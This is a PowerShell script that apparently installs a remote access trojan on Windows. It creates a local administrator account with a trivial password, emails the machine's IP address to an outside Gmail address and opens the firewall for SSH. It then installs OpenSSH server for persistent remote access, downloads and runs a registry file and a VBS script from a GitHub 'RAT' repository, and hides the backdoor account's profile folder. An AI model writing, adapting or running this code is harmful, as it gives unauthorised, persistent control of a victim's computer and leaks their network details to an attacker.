# create local user
function create_account {
    [CmdletBinding()]
    param(
        [string] $NewName,
        [securestring] $Password
    )
    begin{

    }
    process{
        New-LocalUser "$NewName" -Password $Password -FullName "$NewName" -Description "Temporary local admin"
        Write-Verbose "$NewName local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewName"
    }
    end{

    }
}

# Variables
$wd = random_text
$path = Join-Path -Path $env:temp -ChildPath $wd

# Define sender, recipient, subject, and body
$from = "firas.riahi@ensi-uma.tn"
$to = "riahifiras08@gmail.com"
$subject = "Test Email"
$ipConfigOutput = ipconfig
$ip = $ipConfigOutput | Select-String -Pattern 'IPv4 Address.*: ((\d{1,3}\.){3}\d{1,3})' | ForEach-Object { $_.Matches.Groups[1].Value }

# If IPv4 address is found, proceed with sending the email
if ($ip) {
    $body = "Ched addresset ip: $ip :D ."
    # Send the email here
} else {
    $body = "IPv4 address not found."
}

# Gmail SMTP server settings
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$username = "firas.riahi@ensi-uma.tn"
$password = "" # your app password if you have two-factor authentication enabled

# Create the email object
$email = New-Object System.Net.Mail.MailMessage
$email.From = $from
$email.To.Add($to)
$email.Subject = $subject
$email.Body = $body

# Create SMTP client and send the email
$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)

# Send the email
$smtp.Send($email)

Write-Host "Email sent successfully."

# Create directory if it doesn't exist
if (-not (Test-Path $path)) {
    New-Item -Path $path -ItemType Directory
}

# Change directory
Set-Location $path

# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}

$NewName = "jarbouu3"
$Password = (ConvertTo-SecureString "jarbouu3" -AsPlainText -Force)
create_account -NewName $NewName -Password $Password

Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"

$vbs_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/hello.vbs -OutFile "hello.vbs"



# enable persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'


./wreg.reg; ./hello


cd C:\Users
attrib +h +s +r jarbouu3

Set-Location C:\Users\user\OneDrive\Bureau\rat\files
